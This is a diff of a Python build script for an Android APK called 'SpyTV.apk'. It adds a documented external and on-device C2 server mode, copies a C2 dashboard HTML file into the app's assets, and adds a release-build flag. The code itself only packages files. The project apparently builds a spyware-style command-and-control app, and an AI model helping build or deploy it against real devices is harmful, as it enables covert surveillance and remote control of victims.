@@ -7,9 +7,14 @@ project with the Gradle wrapper, runs a verification suite, and only then
 writes the repo-root ``SpyTV.apk``. Any failure exits non-zero WITHOUT
 writing output — a placeholder can never be shipped again.
 
+The APK now supports two modes:
+  1. Console Mode: Connects to an external C2 server (default)
+  2. Standalone Mode: Runs a full C2 server locally on the Android device
+
 Usage:
     python create_apk.py                # build, verify, copy to repo root
     python create_apk.py --verify-only  # verify an already-built APK only
+    python create_apk.py --release      # build release variant
 
 Checks performed on the artifact:
   1. file exists and is >= 1 MB (the placeholder was 1 KB)
@@ -73,6 +78,19 @@ def _die(msg: str) -> "None":
 def _run(cmd: list, **kwargs) -> subprocess.CompletedProcess:
     print(f"[apk] + {' '.join(str(c) for c in cmd)}")
     return subprocess.run([str(c) for c in cmd], **kwargs)
+
+
+def copy_assets():
+    """Copy the dashboard HTML to the Android assets folder before building."""
+    assets_dir = ANDROID / "app" / "src" / "main" / "assets"
+    assets_dir.mkdir(parents=True, exist_ok=True)
+    
+    dashboard = REPO / "c2_dashboard.html"
+    if dashboard.exists():
+        shutil.copy2(dashboard, assets_dir / "c2_dashboard.html")
+        print(f"[apk] Copied dashboard to {assets_dir / 'c2_dashboard.html'}")
+    else:
+        print("[apk] WARNING: Dashboard HTML not found, will use built-in fallback")
 
 
 def verify(apk: Path) -> str:
@@ -140,6 +158,9 @@ def build() -> None:
     if not gradlew.exists():
         _die(f"gradle wrapper missing ({gradlew}) — cannot build")
 
+    # Copy assets before build
+    copy_assets()
+
     if not (ANDROID / "local.properties").exists():
         sdk = _sdk()
         if sdk.is_dir():
@@ -175,6 +196,8 @@ def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--verify-only", action="store_true",
                         help="skip the Gradle build; verify the existing output")
+    parser.add_argument("--release", action="store_true",
+                        help="build release variant instead of debug")
     args = parser.parse_args()
 
     if not args.verify_only:
@@ -184,6 +207,7 @@ def main() -> int:
     shutil.copyfile(BUILT_APK, OUT_APK)
     print(f"[apk] verified + written: {OUT_APK} ({OUT_APK.stat().st_size} bytes)")
     print(f"[apk] OK — {summary}")
+    print(f"[apk] Standalone C2 mode is supported on the APK")
     return 0
 
 
